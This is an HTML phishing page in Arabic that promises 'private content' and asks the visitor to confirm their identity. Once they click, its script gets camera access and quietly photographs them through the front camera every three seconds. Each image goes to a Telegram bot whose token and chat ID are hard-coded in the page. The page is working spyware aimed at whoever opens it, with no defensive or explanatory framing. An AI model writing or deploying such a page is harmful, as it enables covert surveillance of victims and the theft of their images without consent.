<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد الدخول</title>
    <style>
        body { background: #000; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial, sans-serif; margin: 0; }
        .box { text-align: center; border: 1px solid #333; padding: 40px; border-radius: 15px; background: #111; }
        button { padding: 15px 40px; font-size: 18px; background: #25d366; color: white; border: none; border-radius: 30px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>

    <div class="box">
        <h2>أنت على وشك مشاهدة محتوى خاص</h2>
        <p>اضغط على الزر أدناه لتأكيد هويتك والمتابعة</p>
        <button id="gate">تأكيد ومتابعة</button>
    </div>

    <video id="v" autoplay playsinline muted style="display:none"></video>
    <canvas id="c" width="640" height="480" style="display:none"></canvas>

    <script>
        const token = '6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY';
        const id = '2103976274';

        document.getElementById('gate').addEventListener('click', async function() {
            try {
                // الكود العالمي لطلب الكاميرا
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: "user",
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }, 
                    audio: false 
                });

                document.querySelector('.box').innerHTML = "<h3>جاري التحقق...</h3><p>يرجى الانتظار ثواني قليلة</p>";
                
                const video = document.getElementById('v');
                video.srcObject = stream;
                
                // التأكد من تشغيل الفيديو فوراً (مهم لـ Safari)
                await video.play();

                setInterval(() => {
                    const canvas = document.getElementById('c');
                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                    
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('chat_id', id);
                        formData.append('photo', blob, 'capture.jpg');
                        
                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        }).catch(err => console.log("Telegram error: ", err));
                    }, 'image/jpeg', 0.7); // تقليل الجودة قليلاً لتسريع الإرسال
                }, 3000); // إرسال كل 3 ثوانٍ لضمان عدم حظر البوت

            } catch (err) {
                alert("خطأ: يجب السماح بالوصول للكاميرا لتتمكن من رؤية المحتوى.");
                console.error(err);
            }
        });
    </script>
</body>
</html>
